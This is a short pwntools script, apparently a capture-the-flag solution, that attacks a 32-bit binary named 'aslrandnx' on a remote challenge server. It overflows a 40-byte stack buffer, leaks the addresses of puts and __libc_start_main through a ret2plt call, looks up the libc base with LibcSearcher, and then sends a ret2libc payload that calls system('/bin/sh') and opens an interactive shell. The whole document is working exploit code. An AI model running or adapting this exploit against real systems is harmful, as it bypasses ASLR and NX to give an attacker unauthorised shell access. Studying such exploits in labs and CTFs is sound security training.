from pwn import *
from LibcSearcher import LibcSearcher

context.terminal = ['tmux', 'splitw', '-h']
# context.terminal = ['code']
context(arch='i386', os='Linux', log_level=('debug', 'error')[1])

# p = process('./aslrandnx')
elf_ = ELF('./aslrandnx')
p = remote('pwn1.0ops.sjtu.cn', 10005)
# gdb.attach(p)

char_buffer_size = 40

# 1. leak `__libc_start_main`, and call main again
def leak_dyn_addr(symbol: str) -> int:
    addr_puts = elf_.sym['puts']
    addr_got = elf_.got[symbol]
    addr_main = 0x080484E7

    payload = flat(b'A' * char_buffer_size, 0, p32(addr_puts), addr_main, addr_got)

    p.recvline() # cancel 'defeat xxx'
    p.sendline(payload)

    addr_puts_dyn = u32(p.recvline()[:4])
    print(hex(addr_puts_dyn) + ' -> ' + symbol)
    return addr_puts_dyn

addr_puts_dyn = leak_dyn_addr('puts')
addr_libc_start_main = leak_dyn_addr('__libc_start_main')

libc = LibcSearcher('puts', addr_puts_dyn)
libc.add_condition('__libc_start_main', addr_libc_start_main)

addr_libc_base = addr_puts_dyn - libc.dump('puts')

addr_system = addr_libc_base + libc.dump('system')
addr_bin_sh = addr_libc_base + libc.dump('str_bin_sh')

print(hex(addr_system))

# 2. get shell
payload = flat(b'A' * char_buffer_size, 0, p32(addr_system), 0,  addr_bin_sh)

p.recvline() # cancel 'defeat xxx'
p.sendline(payload)
# print(p.recvline())

p.interactive()
